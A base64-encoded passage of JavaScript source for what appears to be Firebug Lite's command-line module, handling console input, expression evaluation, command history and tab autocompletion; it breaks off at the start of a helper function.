KiAqICogKiAqICogKiAqICogKiAqDQoNCnZhciBfY29tcGxldGlvbiA9DQp7DQogICAgd2luZG93Og0KICAgIFsNCiAgICAgICAgImNvbnNvbGUiDQogICAgXSwNCiAgICANCiAgICBkb2N1bWVudDoNCiAgICBbDQogICAgICAgICJnZXRFbGVtZW50QnlJZCIsIA0KICAgICAgICAiZ2V0RWxlbWVudHNCeVRhZ05hbWUiDQogICAgXQ0KfTsNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KdmFyIF9zdGFjayA9IGZ1bmN0aW9uKGNvbW1hbmQpDQp7DQogICAgRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlLmNvbW1hbmRIaXN0b3J5LnB1c2goY29tbWFuZCk7DQogICAgRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlLmNvbW1hbmRQb2ludGVyID0gDQogICAgICAgIEZpcmVidWcuY29udGV4dC5wZXJzaXN0ZWRTdGF0ZS5jb21tYW5kSGlzdG9yeS5sZW5ndGg7DQp9Ow0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIENvbW1hbmRMaW5lDQoNCkZpcmVidWcuQ29tbWFuZExpbmUgPSBleHRlbmQoRmlyZWJ1Zy5Nb2R1bGUsDQp7DQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICANCiAgICBlbGVtZW50OiBudWxsLA0KICAgIGlzTXVsdGlMaW5lOiBmYWxzZSwNCiAgICBpc0FjdGl2ZTogZmFsc2UsDQogIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICANCiAgICBpbml0aWFsaXplOiBmdW5jdGlvbihkb2MpDQogICAgew0KICAgICAgICB0aGlzLmNsZWFyID0gYmluZCh0aGlzLmNsZWFyLCB0aGlzKTsNCiAgICAgICAgdGhpcy5lbnRlciA9IGJpbmQodGhpcy5lbnRlciwgdGhpcyk7DQogICAgICAgIA0KICAgICAgICB0aGlzLm9uRXJyb3IgPSBiaW5kKHRoaXMub25FcnJvciwgdGhpcyk7DQogICAgICAgIHRoaXMub25LZXlEb3duID0gYmluZCh0aGlzLm9uS2V5RG93biwgdGhpcyk7DQogICAgICAgIHRoaXMub25NdWx0aUxpbmVLZXlEb3duID0gYmluZCh0aGlzLm9uTXVsdGlMaW5lS2V5RG93biwgdGhpcyk7DQogICAgICAgIA0KICAgICAgICBhZGRFdmVudChGaXJlYnVnLmJyb3dzZXIud2luZG93LCAiZXJyb3IiLCB0aGlzLm9uRXJyb3IpOw0KICAgICAgICBhZGRFdmVudChGaXJlYnVnLmNocm9tZS53aW5kb3csICJlcnJvciIsIHRoaXMub25FcnJvcik7DQogICAgfSwNCiAgICANCiAgICBzaHV0ZG93bjogZnVuY3Rpb24oZG9jKQ0KICAgIHsNCiAgICAgICAgdGhpcy5kZWFjdGl2YXRlKCk7DQogICAgICAgIA0KICAgICAgICByZW1vdmVFdmVudChGaXJlYnVnLmJyb3dzZXIud2luZG93LCAiZXJyb3IiLCB0aGlzLm9uRXJyb3IpOw0KICAgICAgICByZW1vdmVFdmVudChGaXJlYnVnLmNocm9tZS53aW5kb3csICJlcnJvciIsIHRoaXMub25FcnJvcik7DQogICAgfSwNCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgDQogICAgYWN0aXZhdGU6IGZ1bmN0aW9uKG11bHRpTGluZSwgaGlkZVRvZ2dsZUljb24sIG9uUnVuKQ0KICAgIHsNCiAgICAgICAgZGVmaW5lQ29tbWFuZExpbmVBUEkoKTsNCiAgICAgICAgDQogICAgICAgICBGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuY29tbWFuZEhpc3RvcnkgPSAgDQogICAgICAgICAgICAgRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlLmNvbW1hbmRIaXN0b3J5IHx8IFtdOw0KDQogICAgICAgICBGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuY29tbWFuZFBvaW50ZXIgPSAgDQogICAgICAgICAgICAgRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlLmNvbW1hbmRQb2ludGVyIHx8IC0xOw0KICAgICAgICANCiAgICAgICAgaWYgKHRoaXMuaXNBY3RpdmUpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICh0aGlzLmlzTXVsdGlMaW5lID09IG11bHRpTGluZSkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB0aGlzLmRlYWN0aXZhdGUoKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgZmJDb21tYW5kTGluZSA9ICQoImZiQ29tbWFuZExpbmUiKTsNCiAgICAgICAgZmJMYXJnZUNvbW1hbmRMaW5lID0gJCgiZmJMYXJnZUNvbW1hbmRMaW5lIik7DQogICAgICAgIGZiTGFyZ2VDb21tYW5kQnV0dG9ucyA9ICQoImZiTGFyZ2VDb21tYW5kQnV0dG9ucyIpOw0KICAgICAgICANCiAgICAgICAgaWYgKG11bHRpTGluZSkNCiAgICAgICAgew0KICAgICAgICAgICAgb25SdW4gPSBvblJ1biB8fCB0aGlzLmVudGVyOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB0aGlzLmlzTXVsdGlMaW5lID0gdHJ1ZTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdGhpcy5lbGVtZW50ID0gZmJMYXJnZUNvbW1hbmRMaW5lOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBhZGRFdmVudCh0aGlzLmVsZW1lbnQsICJrZXlkb3duIiwgdGhpcy5vbk11bHRpTGluZUtleURvd24pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBhZGRFdmVudCgkKCJmYlNtYWxsQ29tbWFuZExpbmVJY29uIiksICJjbGljayIsIEZpcmVidWcuY2hyb21lLmhpZGVMYXJnZUNvbW1hbmRMaW5lKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdGhpcy5ydW5CdXR0b24gPSBuZXcgQnV0dG9uKHsNCiAgICAgICAgICAgICAgICBlbGVtZW50OiAkKCJmYkNvbW1hbmRfYnRSdW4iKSwNCiAgICAgICAgICAgICAgICBvd25lcjogRmlyZWJ1Zy5Db21tYW5kTGluZSwNCiAgICAgICAgICAgICAgICBvbkNsaWNrOiBvblJ1bg0KICAgICAgICAgICAgfSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHRoaXMucnVuQnV0dG9uLmluaXRpYWxpemUoKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdGhpcy5jbGVhckJ1dHRvbiA9IG5ldyBCdXR0b24oew0KICAgICAgICAgICAgICAgIGVsZW1lbnQ6ICQoImZiQ29tbWFuZF9idENsZWFyIiksDQogICAgICAgICAgICAgICAgb3duZXI6IEZpcmVidWcuQ29tbWFuZExpbmUsDQogICAgICAgICAgICAgICAgb25DbGljazogdGhpcy5jbGVhcg0KICAgICAgICAgICAgfSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHRoaXMuY2xlYXJCdXR0b24uaW5pdGlhbGl6ZSgpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5pc011bHRpTGluZSA9IGZhbHNlOw0KICAgICAgICAgICAgdGhpcy5lbGVtZW50ID0gZmJDb21tYW5kTGluZTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCFmYkNvbW1hbmRMaW5lKQ0KICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgYWRkRXZlbnQodGhpcy5lbGVtZW50LCAia2V5ZG93biIsIHRoaXMub25LZXlEb3duKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgLy9GaXJlYnVnLkNvbnNvbGUubG9nKCJhY3RpdmF0ZSIsIHRoaXMuZWxlbWVudCk7DQogICAgICAgIA0KICAgICAgICBpZiAoaXNPcGVyYSkNCiAgICAgICAgICBmaXhPcGVyYVRhYktleSh0aGlzLmVsZW1lbnQpOw0KICAgICAgICANCiAgICAgICAgaWYodGhpcy5sYXN0VmFsdWUpDQogICAgICAgICAgICB0aGlzLmVsZW1lbnQudmFsdWUgPSB0aGlzLmxhc3RWYWx1ZTsNCiAgICAgICAgDQogICAgICAgIHRoaXMuaXNBY3RpdmUgPSB0cnVlOw0KICAgIH0sDQogICAgDQogICAgZGVhY3RpdmF0ZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgaWYgKCF0aGlzLmlzQWN0aXZlKSByZXR1cm47DQogICAgICAgIA0KICAgICAgICAvL0ZpcmVidWcuQ29uc29sZS5sb2coImRlYWN0aXZhdGUiLCB0aGlzLmVsZW1lbnQpOw0KICAgICAgICANCiAgICAgICAgdGhpcy5pc0FjdGl2ZSA9IGZhbHNlOw0KICAgICAgICANCiAgICAgICAgdGhpcy5sYXN0VmFsdWUgPSB0aGlzLmVsZW1lbnQudmFsdWU7DQogICAgICAgIA0KICAgICAgICBpZiAodGhpcy5pc011bHRpTGluZSkNCiAgICAgICAgew0KICAgICAgICAgICAgcmVtb3ZlRXZlbnQodGhpcy5lbGVtZW50LCAia2V5ZG93biIsIHRoaXMub25NdWx0aUxpbmVLZXlEb3duKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcmVtb3ZlRXZlbnQoJCgiZmJTbWFsbENvbW1hbmRMaW5lSWNvbiIpLCAiY2xpY2siLCBGaXJlYnVnLmNocm9tZS5oaWRlTGFyZ2VDb21tYW5kTGluZSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHRoaXMucnVuQnV0dG9uLmRlc3Ryb3koKTsNCiAgICAgICAgICAgIHRoaXMuY2xlYXJCdXR0b24uZGVzdHJveSgpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcmVtb3ZlRXZlbnQodGhpcy5lbGVtZW50LCAia2V5ZG93biIsIHRoaXMub25LZXlEb3duKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgdGhpcy5lbGVtZW50ID0gbnVsbDsNCiAgICAgICAgZGVsZXRlIHRoaXMuZWxlbWVudDsNCiAgICAgICAgDQogICAgICAgIGZiQ29tbWFuZExpbmUgPSBudWxsOw0KICAgICAgICBmYkxhcmdlQ29tbWFuZExpbmUgPSBudWxsOw0KICAgICAgICBmYkxhcmdlQ29tbWFuZEJ1dHRvbnMgPSBudWxsOw0KICAgIH0sDQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIA0KICAgIGZvY3VzOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICB0aGlzLmVsZW1lbnQuZm9jdXMoKTsNCiAgICB9LA0KICAgIA0KICAgIGJsdXI6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHRoaXMuZWxlbWVudC5ibHVyKCk7DQogICAgfSwNCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgDQogICAgY2xlYXI6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHRoaXMuZWxlbWVudC52YWx1ZSA9ICIiOw0KICAgIH0sDQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIA0KICAgIGV2YWx1YXRlOiBmdW5jdGlvbihleHByKQ0KICAgIHsNCiAgICAgICAgLy8gVE9ETzogbmVlZCB0byByZWdpc3RlciB0aGUgQVBJIGluIGNvbnNvbGUuZmlyZWJ1Zy5jb21tYW5kTGluZUFQSQ0KICAgICAgICB2YXIgYXBpID0gIkZpcmVidWcuQ29tbWFuZExpbmUuQVBJIjsNCiAgICAgICAgDQogICAgICAgIHZhciByZXN1bHQgPSBGaXJlYnVnLmNvbnRleHQuZXZhbHVhdGUoZXhwciwgIndpbmRvdyIsIGFwaSwgRmlyZWJ1Zy5Db25zb2xlLmVycm9yKTsNCiAgICAgICAgDQogICAgICAgIHJldHVybiByZXN1bHQ7DQogICAgfSwNCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgDQogICAgZW50ZXI6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHZhciBjb21tYW5kID0gdGhpcy5lbGVtZW50LnZhbHVlOw0KICAgICAgICANCiAgICAgICAgaWYgKCFjb21tYW5kKSByZXR1cm47DQogICAgICAgIA0KICAgICAgICBfc3RhY2soY29tbWFuZCk7DQogICAgICAgIA0KICAgICAgICBGaXJlYnVnLkNvbnNvbGUubG9nKGNvbW1hbmRQcmVmaXggKyAiICIgKyBzdHJpcE5ld0xpbmVzKGNvbW1hbmQpLCANCiAgICAgICAgICAgICAgICBGaXJlYnVnLmJyb3dzZXIsICJjb21tYW5kIiwgRmlyZWJ1Z1JlcHMuVGV4dCk7DQogICAgICAgIA0KICAgICAgICB2YXIgcmVzdWx0ID0gdGhpcy5ldmFsdWF0ZShjb21tYW5kKTsNCiAgICAgICAgDQogICAgICAgIEZpcmVidWcuQ29uc29sZS5sb2cocmVzdWx0KTsNCiAgICB9LA0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICANCiAgICBwcmV2Q29tbWFuZDogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgaWYgKEZpcmVidWcuY29udGV4dC5wZXJzaXN0ZWRTdGF0ZS5jb21tYW5kUG9pbnRlciA+IDAgJiYgDQogICAgICAgICAgICBGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuY29tbWFuZEhpc3RvcnkubGVuZ3RoID4gMCkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5lbGVtZW50LnZhbHVlID0gRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlLmNvbW1hbmRIaXN0b3J5DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbLS1GaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuY29tbWFuZFBvaW50ZXJdOw0KICAgICAgICB9DQogICAgfSwNCiAgDQogICAgbmV4dENvbW1hbmQ6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHZhciBlbGVtZW50ID0gdGhpcy5lbGVtZW50Ow0KICAgICAgICANCiAgICAgICAgdmFyIGxpbWl0ID0gRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlLmNvbW1hbmRIaXN0b3J5Lmxlbmd0aCAtMTsNCiAgICAgICAgdmFyIGkgPSBGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuY29tbWFuZFBvaW50ZXI7DQogICAgICAgIA0KICAgICAgICBpZiAoaSA8IGxpbWl0KQ0KICAgICAgICAgIGVsZW1lbnQudmFsdWUgPSBGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuY29tbWFuZEhpc3RvcnkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsrK0ZpcmVidWcuY29udGV4dC5wZXJzaXN0ZWRTdGF0ZS5jb21tYW5kUG9pbnRlcl07DQogICAgICAgICAgDQogICAgICAgIGVsc2UgaWYgKGkgPT0gbGltaXQpDQogICAgICAgIHsNCiAgICAgICAgICAgICsrRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlLmNvbW1hbmRQb2ludGVyOw0KICAgICAgICAgICAgZWxlbWVudC52YWx1ZSA9ICIiOw0KICAgICAgICB9DQogICAgfSwNCiAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIA0KICAgIGF1dG9jb21wbGV0ZTogZnVuY3Rpb24ocmV2ZXJzZSkNCiAgICB7DQogICAgICAgIHZhciBlbGVtZW50ID0gdGhpcy5lbGVtZW50Ow0KICAgICAgICANCiAgICAgICAgdmFyIGNvbW1hbmQgPSBlbGVtZW50LnZhbHVlOw0KICAgICAgICB2YXIgb2Zmc2V0ID0gZ2V0RXhwcmVzc2lvbk9mZnNldChjb21tYW5kKTsNCg0KICAgICAgICB2YXIgdmFsQmVnaW4gPSBvZmZzZXQgPyBjb21tYW5kLnN1YnN0cigwLCBvZmZzZXQpIDogIiI7DQogICAgICAgIHZhciB2YWwgPSBjb21tYW5kLnN1YnN0cihvZmZzZXQpOw0KICAgICAgICANCiAgICAgICAgdmFyIGJ1ZmZlciwgb2JqLCBvYmpOYW1lLCBjb21tYW5kQmVnaW4sIHJlc3VsdCwgcHJlZml4Ow0KICAgICAgICANCiAgICAgICAgLy8gaWYgaXQgaXMgdGhlIGJlZ2lubmluZyBvZiB0aGUgY29tcGxldGlvbg0KICAgICAgICBpZighaXNBdXRvQ29tcGxldGluZykNCiAgICAgICAgew0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBncm91cDEgLSBjb21tYW5kIGJlZ2luDQogICAgICAgICAgICAvLyBncm91cDIgLSBiYXNlIG9iamVjdA0KICAgICAgICAgICAgLy8gZ3JvdXAzIC0gcHJvcGVydHkgcHJlZml4DQogICAgICAgICAgICB2YXIgcmVPYmogPSAvKC4qW15fJFx3XGRcLl0pPygoPzpbXyRcd11bXyRcd1xkXSpcLikqKShbXyRcd11bXyRcd1xkXSopPyQvOw0KICAgICAgICAgICAgdmFyIHIgPSByZU9iai5leGVjKHZhbCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIHBhcnNlIGNvbW1hbmQNCiAgICAgICAgICAgIGlmIChyWzFdIHx8IHJbMl0gfHwgclszXSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBjb21tYW5kQmVnaW4gPSByWzFdIHx8ICIiOw0KICAgICAgICAgICAgICAgIG9iak5hbWUgPSByWzJdIHx8ICIiOw0KICAgICAgICAgICAgICAgIHByZWZpeCA9IHJbM10gfHwgIiI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIGlmICh2YWwgPT0gIiIpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY29tbWFuZEJlZ2luID0gb2JqTmFtZSA9IHByZWZpeCA9ICIiOw0KICAgICAgICAgICAgfSBlbHNlDQogICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpc0F1dG9Db21wbGV0aW5nID0gdHJ1ZTsNCiAgICAgIA0KICAgICAgICAgICAgLy8gZmluZCBiYXNlIG9iamVjdA0KICAgICAgICAgICAgaWYob2JqTmFtZSA9PSAiIikNCiAgICAgICAgICAgICAgICBvYmogPSB3aW5kb3c7DQogICAgICAgICAgICAgIA0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIG9iak5hbWUgPSBvYmpOYW1lLnJlcGxhY2UoL1wuJC8sICIiKTsNCiAgICAgICAgDQogICAgICAgICAgICAgICAgdmFyIG4gPSBvYmpOYW1lLnNwbGl0KCIuIik7DQogICAgICAgICAgICAgICAgdmFyIHRhcmdldCA9IHdpbmRvdywgbzsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBmb3IgKHZhciBpPTAsIG5pOyBuaSA9IG5baV07IGkrKykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChvID0gdGFyZ2V0W25pXSkNCiAgICAgICAgICAgICAgICAgICAgICB0YXJnZXQgPSBvOw0KICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHRhcmdldCA9IG51bGw7DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBvYmogPSB0YXJnZXQ7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIG1hcCBiYXNlIG9iamVjdA0KICAgICAgICAgICAgaWYob2JqKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGF1dG9Db21wbGV0ZVByZWZpeCA9IHByZWZpeDsNCiAgICAgICAgICAgICAgICBhdXRvQ29tcGxldGVFeHByID0gdmFsQmVnaW4gKyBjb21tYW5kQmVnaW4gKyAob2JqTmFtZSA/IG9iak5hbWUgKyAiLiIgOiAiIik7DQogICAgICAgICAgICAgICAgYXV0b0NvbXBsZXRlUG9zaXRpb24gPSAtMTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBidWZmZXIgPSBhdXRvQ29tcGxldGVCdWZmZXIgPSBpc0lFID8NCiAgICAgICAgICAgICAgICAgICAgX2NvbXBsZXRpb25bb2JqTmFtZSB8fCAid2luZG93Il0gfHwgW10gOiBbXTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBmb3IodmFyIHAgaW4gb2JqKQ0KICAgICAgICAgICAgICAgICAgICBidWZmZXIucHVzaChwKTsNCiAgICAgICAgICAgIH0NCiAgICANCiAgICAgICAgLy8gaWYgaXQgaXMgdGhlIGNvbnRpbnVhdGlvbiBvZiB0aGUgbGFzdCBjb21wbGV0aW9uDQogICAgICAgIH0gZWxzZQ0KICAgICAgICAgIGJ1ZmZlciA9IGF1dG9Db21wbGV0ZUJ1ZmZlcjsNCiAgICAgICAgDQogICAgICAgIGlmIChidWZmZXIpDQogICAgICAgIHsNCiAgICAgICAgICAgIHByZWZpeCA9IGF1dG9Db21wbGV0ZVByZWZpeDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIGRpZmYgPSByZXZlcnNlID8gLTEgOiAxOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBmb3IodmFyIGk9YXV0b0NvbXBsZXRlUG9zaXRpb24rZGlmZiwgbD1idWZmZXIubGVuZ3RoLCBiaTsgaT49MCAmJiBpPGw7IGkrPWRpZmYpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgYmkgPSBidWZmZXJbaV07DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKGJpLmluZGV4T2YocHJlZml4KSA9PSAwKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYXV0b0NvbXBsZXRlUG9zaXRpb24gPSBpOw0KICAgICAgICAgICAgICAgICAgICByZXN1bHQgPSBiaTsNCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBpZiAocmVzdWx0KQ0KICAgICAgICAgICAgZWxlbWVudC52YWx1ZSA9IGF1dG9Db21wbGV0ZUV4cHIgKyByZXN1bHQ7DQogICAgfSwNCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgDQogICAgc2V0TXVsdGlMaW5lOiBmdW5jdGlvbihtdWx0aUxpbmUpDQogICAgew0KICAgICAgICBpZiAobXVsdGlMaW5lID09IHRoaXMuaXNNdWx0aUxpbmUpIHJldHVybjsNCiAgICAgICAgDQogICAgICAgIHRoaXMuYWN0aXZhdGUobXVsdGlMaW5lKTsNCiAgICB9LA0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICANCiAgICBvbkVycm9yOiBmdW5jdGlvbihtc2csIGhyZWYsIGxpbmVObykNCiAgICB7DQogICAgICAgIGhyZWYgPSBocmVmIHx8ICIiOw0KICAgICAgICANCiAgICAgICAgdmFyIGxhc3RTbGFzaCA9IGhyZWYubGFzdEluZGV4T2YoIi8iKTsNCiAgICAgICAgdmFyIGZpbGVOYW1lID0gbGFzdFNsYXNoID09IC0xID8gaHJlZiA6IGhyZWYuc3Vic3RyKGxhc3RTbGFzaCsxKTsNCiAgICAgICAgdmFyIGh0bWwgPSBbDQogICAgICAgICAgICAnPHNwYW4gY2xhc3M9ImVycm9yTWVzc2FnZSI+JywgbXNnLCAnPC9zcGFuPicsIA0KICAgICAgICAgICAgJzxkaXYgY2xhc3M9Im9iamVjdEJveC1zb3VyY2VMaW5rIj4nLCBmaWxlTmFtZSwgJyAobGluZSAnLCBsaW5lTm8sICcpPC9kaXY+Jw0KICAgICAgICAgIF07DQogICAgICAgIA0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBhanVzdCB0byBDb25zb2xlMg0KICAgICAgICAvL0ZpcmVidWcuQ29uc29sZS53cml0ZVJvdyhodG1sLCAiZXJyb3IiKTsNCiAgICB9LA0KICAgIA0KICAgIG9uS2V5RG93bjogZnVuY3Rpb24oZSkNCiAgICB7DQogICAgICAgIGUgPSBlIHx8IGV2ZW50Ow0KICAgICAgICANCiAgICAgICAgdmFyIGNvZGUgPSBlLmtleUNvZGU7DQogICAgICAgIA0KICAgICAgICAvKnRhYiwgc2hpZnQsIGNvbnRyb2wsIGFsdCovDQogICAgICAgIGlmIChjb2RlICE9IDkgJiYgY29kZSAhPSAxNiAmJiBjb2RlICE9IDE3ICYmIGNvZGUgIT0gMTgpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlzQXV0b0NvbXBsZXRpbmcgPSBmYWxzZTsNCiAgICAgICAgfQ0KICAgIA0KICAgICAgICBpZiAoY29kZSA9PSAxMyAvKiBlbnRlciAqLykNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5lbnRlcigpOw0KICAgICAgICAgICAgdGhpcy5jbGVhcigpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UgaWYgKGNvZGUgPT0gMjcgLyogRVNDICovKQ0KICAgICAgICB7DQogICAgICAgICAgICBzZXRUaW1lb3V0KHRoaXMuY2xlYXIsIDApOw0KICAgICAgICB9IA0KICAgICAgICBlbHNlIGlmIChjb2RlID09IDM4IC8qIHVwICovKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLnByZXZDb21tYW5kKCk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSBpZiAoY29kZSA9PSA0MCAvKiBkb3duICovKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLm5leHRDb21tYW5kKCk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSBpZiAoY29kZSA9PSA5IC8qIHRhYiAqLykNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5hdXRvY29tcGxldGUoZS5zaGlmdEtleSk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICANCiAgICAgICAgY2FuY2VsRXZlbnQoZSwgdHJ1ZSk7DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9LA0KICAgIA0KICAgIG9uTXVsdGlMaW5lS2V5RG93bjogZnVuY3Rpb24oZSkNCiAgICB7DQogICAgICAgIGUgPSBlIHx8IGV2ZW50Ow0KICAgICAgICANCiAgICAgICAgdmFyIGNvZGUgPSBlLmtleUNvZGU7DQogICAgICAgIA0KICAgICAgICBpZiAoY29kZSA9PSAxMyAvKiBlbnRlciAqLyAmJiBlLmN0cmxLZXkpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRoaXMuZW50ZXIoKTsNCiAgICAgICAgfQ0KICAgIH0NCn0pOw0KDQpGaXJlYnVnLnJlZ2lzdGVyTW9kdWxlKEZpcmVidWcuQ29tbWFuZExpbmUpOw0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gDQoNCmZ1bmN0aW9uIGdldEV4cHJlc3Npb25PZmZzZXQoY29tbWFuZCkNCnsNCiAgICAvLyBYWFhq